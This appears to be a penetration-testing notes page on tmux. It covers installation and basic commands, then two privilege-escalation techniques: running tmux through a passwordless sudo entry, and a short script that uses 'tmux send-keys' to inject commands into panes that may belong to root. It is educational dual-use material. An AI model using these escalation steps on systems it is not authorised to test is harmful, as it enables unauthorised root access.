# Tmux Privilege

## OverView

`Tmux` is an open-source *terminal multiplexer* for `Unix-like` operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. It can also be used to detach processes from their controlling terminals, allowing remote sessions to remain active without being visible

`Tmux` includes most features of GNU Screen. It allows users to start a terminal session with clients that are not bound to a specific physical or virtual console; multiple terminal sessions can be created within a single terminal session and then freely rebound from one virtual console to another, and each session can have several connected clients.

## How to install `Tmux`

> sudo apt install tmux

## How it works;

For detailed instructions we can use.
> tmux -h

![image](https://user-images.githubusercontent.com/63194321/147381941-723550ba-4e5a-4e3e-83d7-67531634d701.png)


You can start `tmux` using the terminal:

> tmux

![image](https://user-images.githubusercontent.com/63194321/147381788-2c6a021f-0ea9-4d69-b79d-00e0c02c4578.png)

Create a new session with your own name:

> tmux new -s <session_name>

list available sessions:

> tmux ls

*In addition, when entering the GUI of `tmux` you can find out more at [Tmux cheat sheet](https://quickref.me/tmux)*

## Tmux Privilege Escalation

1. Privilege Escalation with `Sudo`

After gaining access to the victim machine check the permissions on the victim account.Found the victim's account to have access to tmux with `sudo` without a password.
> sudo -l

![image](https://user-images.githubusercontent.com/63194321/147386330-f6b9b3e6-3871-43dd-9f23-7a497f7d4606.png)

As a user with sudo privileges we can use this to escalate privileges.
> sudo tmux

![image](https://user-images.githubusercontent.com/63194321/147386349-91c10c4e-f3e3-4b60-820d-0f4681bb4f58.png)

2. Tmux privilege escalation abusing send-keys

A script run as user in tmux can under some circumstances execute commands as root.

There's a tmux feature to send keystrokes to a pane.

`tmux send-keys -t $pane 'C-c'` for example sends SIGINT to whatever is running in pane $pane.

If in the `tmux` compartment there is a user running as the `root` user we can take advantage of this to perform escalation.

![image](https://user-images.githubusercontent.com/63194321/147386959-3e45e22c-f1f3-4c5e-85ab-7ae5b4ee2eef.png)

Next create a script with the following content:
> #!/bin/sh  
for pane in `tmux list-panes | grep -Po '^\d'`; do  
tmux send-keys -t $pane 'whoami' Enter ;  
done;

![image](https://user-images.githubusercontent.com/63194321/147386999-ff170cc1-3657-4cfc-a553-c6e3730d94e1.png)

Run the script on a user without `root` privileges.

![image](https://user-images.githubusercontent.com/63194321/147387067-bd469cde-7dad-4eb2-aa3e-f00ce170f1cd.png)



### Reference 

[https://viblo.asia/p/gioi-thieu-co-ban-ve-tmux-zoZVRgLEMmg5](https://viblo.asia/p/gioi-thieu-co-ban-ve-tmux-zoZVRgLEMmg5)

[https://www.joyk.com/dig/detail/1562877072279933](https://www.joyk.com/dig/detail/1562877072279933)

[https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/)







